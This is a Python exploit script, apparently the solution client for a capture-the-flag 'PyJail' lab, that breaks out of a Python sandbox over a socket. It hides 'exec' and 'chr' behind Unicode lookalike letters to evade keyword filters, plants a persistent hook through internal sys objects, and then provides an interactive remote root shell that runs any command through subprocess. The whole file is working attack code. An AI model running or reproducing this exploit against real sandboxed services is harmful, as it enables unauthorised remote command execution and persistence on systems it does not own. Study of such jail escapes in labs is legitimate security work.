#!/usr/bin/env python3
import socket
import time
import sys
import argparse

def to_u(s):
    return "".join(chr(0x1D41A + ord(c) - ord("a")) if "a" <= c <= "z" else c for c in s)

u_exec = to_u("exec")
u_chr = to_u("chr")

def make_str(s):
    return "+".join(f"{u_chr}({ord(c)})" for c in s)

def get_stage1_payload():
    cond = "[[sys.argv[sys.f][sys.f]]in[[sys.executable[sys.f]]]][sys.f]"
    targets_51 = ",".join(["x"] * 19 + ["sys.m"] + ["x"] * 31)

    line1 = "[[sys]for[sys.t]in[[[sys]in[[sys]]]]]," \
            "[[sys]for[sys.f]in[[[sys]in[]]]]," \
            "[[sys]for[sys.c]in[[sys.__spec__._uninitialized_submodules.__new__.__self__]]]," \
            f"[[sys]for[{targets_51}]in[[],[[sys.modules]][sys.f]][{cond}]]," \
            f"[[sys]for[sys.u]in[[sys.modules[sys.m].f.name]if{cond}else[sys.argv[sys.f]]]]," \
            f"[[sys]for[idk.__defaults__]in[[sys.c[sys.u,sys.remote_exec].__args__]if{cond}else[sys.c[sys.t,sys.u,sys.remote_exec].__args__]]]," \
            "[[sys]for[sys.stdout.flush]in[[idk]]]," \
            f"[[sys]for[x]in[[idk]]if{cond}for[sys.modules[sys.m].time.sleep]in[[x]]]"
    return line1

def exec_code(host, port, raw_python, timeout=5):
    payload = f"{u_exec}({make_str(raw_python)})"
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    s.recv(1024)
    s.sendall(payload.encode() + b"\n")
    time.sleep(0.3)
    s.sendall(b"END\n")
    s.recv(1024)
    out = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            out += chunk
            if b":OUT_END" in out:
                break
        except Exception:
            break
    s.close()
    return out

def exec_cmd(host, port, cmd):
    py = f"""
import sys, subprocess
m = sys.modules["__main__"]
out = subprocess.getoutput({repr(cmd)})
m.client_socket.sendall(b"OUT_START:" + out.encode() + b":OUT_END\\n")
""".strip()
    res = exec_code(host, port, py)
    if b"OUT_START:" in res:
        parts = res.split(b"OUT_START:", 1)[1]
        if b":OUT_END" in parts:
            return parts.split(b":OUT_END", 1)[0].decode("utf-8", "ignore")
        return parts.decode("utf-8", "ignore")
    return None

def infect(host, port):
    print(f"[*] Deploying Stage 1 persistent hook on {host}:{port}...")
    line1 = get_stage1_payload()
    s = socket.socket()
    s.settimeout(10)
    s.connect((host, port))
    s.recv(1024)
    s.sendall(line1.encode() + b"\n")
    time.sleep(0.3)
    s.sendall(b"END\n")
    s.recv(1024)
    s.close()
    time.sleep(1.5)
    # verify
    out = exec_cmd(host, port, "echo PWNED")
    if out and "PWNED" in out:
        print("[+] Stage 1 successful! PID 1 hooked and persistent.")
        return True
    print("[-] Stage 1 hook verification failed.")
    return False

def main():
    parser = argparse.ArgumentParser(description="PyJail Lab Interactive Client")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("-p", "--port", type=int, default=1337, help="Target port")
    parser.add_argument("-c", "--command", help="Single command to run")
    args = parser.parse_args()

    # Test if server already hooked
    test = exec_cmd(args.host, args.port, "echo OK")
    if not test or "OK" not in test:
        if not infect(args.host, args.port):
            print("[-] Could not connect or infect server.")
            sys.exit(1)

    if args.command:
        out = exec_cmd(args.host, args.port, args.command)
        if out is not None:
            print(out)
        else:
            print("[-] No output received.")
        return

    print("="*60)
    print("  🔥 PyJail Interactive Root Shell 🔥")
    print(f"  Target: {args.host}:{args.port}")
    print("  Type any Linux shell command or 'exit' to quit.")
    print("="*60)

    while True:
        try:
            cmd = input("\033[1;32mpyjail-lab#\033[0m ").strip()
            if not cmd: continue
            if cmd in ("exit", "quit", "q"):
                print("[*] Exiting shell.")
                break
            out = exec_cmd(args.host, args.port, cmd)
            if out is not None:
                print(out)
            else:
                print("[-] Command timed out or no output.")
        except KeyboardInterrupt:
            print("\n[*] Exiting.")
            break

if __name__ == "__main__":
    main()
